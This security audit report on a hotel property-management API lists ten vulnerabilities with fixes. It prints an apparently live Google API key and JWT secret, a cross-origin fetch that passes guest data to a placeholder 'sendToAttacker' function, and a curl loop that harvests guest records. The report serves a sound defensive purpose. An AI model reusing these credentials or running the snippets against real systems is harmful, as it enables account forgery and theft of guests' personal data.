# Security Audit Report: Hotel Munich PMS

## Executive Summary

**Audit Date:** 2026-02-04
**Scope:** Backend API security assessment
**Overall Risk Level:** **CRITICAL** - Immediate action required

The Hotel Munich PMS contains multiple critical security vulnerabilities that expose the system to unauthorized access, data theft, and credential compromise. **Two issues require immediate action within 24 hours.**

---

## Critical Findings (Fix Immediately)

### VULN-001: Exposed API Keys in Version Control
**Severity:** CRITICAL | **File:** `backend/.env`

**Vector:** Real secrets committed to git repository
```
GOOGLE_API_KEY=AIzaSyDFunQh6MFY5kGG0pQpzO_mHGtptTdIyxU
JWT_SECRET_KEY=EpxYO-CwQR-Ycq8Dc0TwTuZV2TSz1mHO2ivhzzm6p9k
```

**Impact:**
- Attackers can forge JWT tokens and impersonate any user
- Google API billing charges from unauthorized usage
- Complete authentication bypass

**Fix:**
1. IMMEDIATELY revoke both keys in Google Cloud Console
2. Generate new JWT_SECRET_KEY: `openssl rand -base64 32`
3. Remove from git history: `git filter-branch --tree-filter 'rm -f backend/.env' HEAD`
4. Force all users to re-authenticate

---

### VULN-002: CORS Misconfiguration Allows Credential Theft
**Severity:** CRITICAL | **File:** `backend/api/main.py:121-127`

**Vector:** Wildcard origin with credentials enabled
```python
CORS_ORIGINS = ["*"]
app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials=True,  # DANGEROUS with "*"
)
```

**Exploit:** Any malicious website can make authenticated requests to API
```javascript
// Attacker's site
fetch('https://hotel-api.com/api/v1/guests/', {credentials: 'include'})
  .then(r => r.json())
  .then(data => sendToAttacker(data));
```

**Fix:**
```python
CORS_ORIGINS = [
    "http://localhost:3000",
    "http://localhost:8501",
    "https://your-production-domain.com"
]
```

---

### VULN-003: Unprotected Endpoints Expose PII (IDOR)
**Severity:** CRITICAL | **Multiple Files**

**Unprotected endpoints exposing sensitive data:**

| Endpoint | File:Line | Data Exposed |
|----------|-----------|--------------|
| `GET /api/v1/guests/` | `guests.py:63` | All check-in records |
| `GET /api/v1/guests/{id}` | `guests.py:142` | Full guest PII (name, DOB, document#) |
| `PUT /api/v1/guests/{id}` | `guests.py:160` | Modify any guest |
| `GET /api/v1/reservations/{id}` | `reservations.py:118` | Any reservation |
| `GET /api/v1/guests/billing-history/{doc}` | `guests.py:132` | Billing by document# |
| `POST /api/v1/settings/hotel-name` | `settings.py:53` | Modify system config |
| `POST /api/v1/settings/parking-capacity` | `settings.py:94` | Modify system config (TODO comment!) |

**Exploit:** Direct enumeration attack
```bash
for i in {1..1000}; do
  curl "https://hotel-api.com/api/v1/guests/$i" >> stolen_guests.json
done
```

**Fix:** Add authentication dependency to ALL endpoints:
```python
def get_checkin(
    checkin_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)  # ADD THIS
):
```

---

## High-Risk Findings

### VULN-004: No JWT Token Revocation
**Severity:** HIGH | **File:** `backend/api/core/security.py:130-144`

**Issue:** Logout only closes session record; JWT remains valid until expiry
- Stolen tokens usable for 30 minutes after logout
- No mechanism to invalidate compromised tokens

**Fix:** Implement token blacklist using Redis or database table

---

### VULN-005: No Role-Based Access Control (RBAC)
**Severity:** HIGH | **All Endpoints**

**Issue:**
- User model has `role` field (`database.py:56`)
- `AIAgentPermission` table exists (`database.py:296-318`)
- **Neither is ever checked** - any authenticated user has full access

**Evidence:** `reservations.py:79-95`
```python
def create_reservation(
    data: ReservationCreate,
    current_user = Depends(get_current_user)  # Injected but...
):
    return ReservationService.create_reservations(db, data)  # NEVER USED!
```

**Fix:** Create role-checking dependencies:
```python
def get_admin_user(current_user: User = Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(403, "Admin access required")
    return current_user
```

---

### VULN-006: SQL Injection in Scripts
**Severity:** HIGH | **Scripts (not production)**

**Files with unsafe string interpolation:**
- `scripts/seed_monges.py:462`: `f"SELECT 1 FROM {table}"`
- `scripts/seed_monges.py:481+`: Dynamic column names
- `scripts/migrate_reservations_schema.py:39`: `f"ALTER TABLE ... {col_name}"`

**Risk:** If scripts accept external input, SQL injection possible

**Fix:** Use whitelist validation or SQLAlchemy schema operations

---

## Medium-Risk Findings

### VULN-007: Error Messages Leak Internal Details
**Severity:** MEDIUM | **Multiple Files**

**Examples:**
- `reservations.py:94`: `detail=f"Failed to create reservation: {str(e)}"`
- `settings.py:64`: `detail=f"Error al actualizar: {str(e)}"`
- `pricing.py:55`: `detail=str(e)`

**Fix:** Log detailed errors server-side, return generic messages to client

---

### VULN-008: LIKE Wildcard Not Escaped in Search
**Severity:** MEDIUM | **File:** `services.py:741-749`

**Vector:** Search query `%` returns ALL guests
```python
q = f"%{query}%"  # query = "%" returns everything
results = db.query(CheckIn).filter(CheckIn.last_name.ilike(q))
```

**Fix:** Escape wildcards before search:
```python
safe_query = query.replace('\\', '\\\\').replace('%', '\\%').replace('_', '\\_')
```

---

### VULN-009: Missing Security Headers
**Severity:** MEDIUM | **File:** `backend/api/main.py`

**Missing:**
- No HTTPS enforcement
- No HSTS header
- No TrustedHostMiddleware
- No CSP, X-Frame-Options, X-Content-Type-Options

**Fix:** Add security middleware for production

---

### VULN-010: bcrypt Rounds Not Explicit
**Severity:** LOW | **File:** `security.py:72`

**Issue:** `bcrypt.gensalt()` uses default rounds (~12), should be explicit
```python
salt = bcrypt.gensalt(rounds=12)  # Make explicit
```

---

## Security Recommendations Summary

| ID | Category | Finding | Severity | Fix Effort |
|----|----------|---------|----------|------------|
| VULN-001 | Secrets | API keys in git | CRITICAL | 1 hour |
| VULN-002 | CORS | Wildcard with credentials | CRITICAL | 10 min |
| VULN-003 | AuthZ | 15+ unprotected endpoints | CRITICAL | 2-3 hours |
| VULN-004 | JWT | No token revocation | HIGH | 4 hours |
| VULN-005 | RBAC | No role enforcement | HIGH | 3-4 hours |
| VULN-006 | SQLi | Scripts use string interpolation | HIGH | 1 hour |
| VULN-007 | Errors | Internal details leaked | MEDIUM | 1 hour |
| VULN-008 | Search | LIKE wildcards not escaped | MEDIUM | 30 min |
| VULN-009 | Headers | No security headers | MEDIUM | 30 min |
| VULN-010 | Crypto | bcrypt rounds implicit | LOW | 5 min |

---

## Positive Security Findings

| Area | Status | Notes |
|------|--------|-------|
| JWT Expiry | **GOOD** | 30min access / 7day refresh |
| Password Hashing | **GOOD** | Bcrypt-only, no plaintext |
| Rate Limiting (Login) | **GOOD** | 5/minute on auth endpoints |
| Session Tracking | **GOOD** | Device, IP, user-agent logged |
| SQLAlchemy ORM | **GOOD** | Parameterized queries in production code |
| File Upload Validation | **GOOD** | Type checking in vision endpoint |
| Input Validation | **GOOD** | Pydantic models with validators |

---

## Remediation Priority

### Immediate (24 hours):
1. Revoke and rotate all exposed secrets (VULN-001)
2. Fix CORS configuration (VULN-002)

### This Week:
3. Add authentication to all endpoints (VULN-003)
4. Implement RBAC (VULN-005)
5. Sanitize error messages (VULN-007)

### This Month:
6. Implement JWT blacklist (VULN-004)
7. Fix SQL injection in scripts (VULN-006)
8. Add security headers (VULN-009)
9. Escape LIKE wildcards (VULN-008)

---

## Verification Steps

After fixes, verify:
1. Run `git log --all --full-history -- "*.env"` - should show removal
2. Test CORS: `curl -H "Origin: https://evil.com" -I https://api/endpoint` - should fail
3. Test unauth access: `curl https://api/v1/guests/` - should return 401
4. Test IDOR: Authenticate as user A, try accessing user B's data - should return 403
5. Check error response: Trigger exception, verify no stack trace in response